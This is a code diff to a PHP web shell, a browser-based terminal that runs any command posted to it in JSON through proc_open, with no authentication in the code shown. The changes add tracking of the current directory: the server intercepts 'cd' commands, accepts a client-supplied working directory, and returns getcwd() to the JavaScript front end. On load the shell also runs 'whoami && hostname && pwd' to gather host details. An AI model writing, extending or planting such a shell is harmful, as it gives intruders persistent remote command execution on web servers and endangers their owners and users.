@@ -16,16 +16,27 @@ function my_shell_exec($cmd, &$stdout=null, &$stderr=null) {
     return proc_close($proc);
 }
 
-function exec_command($cmd, $internal = false) {
+function exec_command($cmd, $pwd = null, $internal = false) {
     try {
-        $retval = my_shell_exec($cmd, $shell_exec_stdout, $shell_exec_stderr);
+        if ($pwd) {
+            chdir($pwd);
+        }
+        if (preg_match('/^\s*cd(\s+(?<path>[^\0]*)\s*|\s*)/', $cmd, $matches)) {
+            chdir($matches["path"]);
+            $retval = 0;
+            $shell_exec_stdout = "";
+            $shell_exec_stderr = "";
+        } else {
+            $retval = my_shell_exec($cmd, $shell_exec_stdout, $shell_exec_stderr);
+        }
     } catch (Exception $e) {
         if ($internal === true) {
             return $e->getMessage();
         } else {
             return json_encode([
                 'status' => 'error',
-                'response' => $e->getMessage()
+                'response' => $e->getMessage(),
+                'pwd' => getcwd()
             ]);
         }
     }
@@ -37,19 +48,20 @@ function exec_command($cmd, $internal = false) {
     } else {
         return json_encode([
             'status' => 'ok',
-            'response' => escapetext($shell_exec)
+            'response' => escapetext($shell_exec),
+            'pwd' => getcwd()
         ]);
     }
 }
 
 $postdata = json_decode(file_get_contents('php://input'));
 
-if (!is_null($postdata) && isset($postdata->cmd)) {
-    die(exec_command($postdata->cmd));
+if (!is_null($postdata) && isset($postdata->cmd) && isset($postdata->pwd)) {
+    die(exec_command($postdata->cmd, $postdata->pwd));
 }
 
 try {
-    $hostvars = exec_command('whoami && hostname && pwd', true);
+    $hostvars = exec_command('whoami && hostname && pwd', null, true);
 
     list($whoami, $hostname, $pwd) = explode("\n", $hostvars);
 
@@ -222,15 +234,19 @@ try {
                     'Accept': 'application/json'
                 }),
                 body: JSON.stringify({
-                    cmd
+                    cmd,
+                    pwd: this.pwd,
                 })
             }).then(
                 res => res.json(),
                 err => console.error(err)
-            ).then(({response}) => {
+            ).then(({response, pwd}) => {
                 this.termWindow.innerHTML += `${this.ps1()}${cmd}<br>${response}`;
 
                 this.termWindow.scrollTop = this.termWindow.scrollHeight;
+
+                this.updateCurrentPath(pwd);
+                this.ps1element.innerHTML = this.ps1();
             })
         }
     }
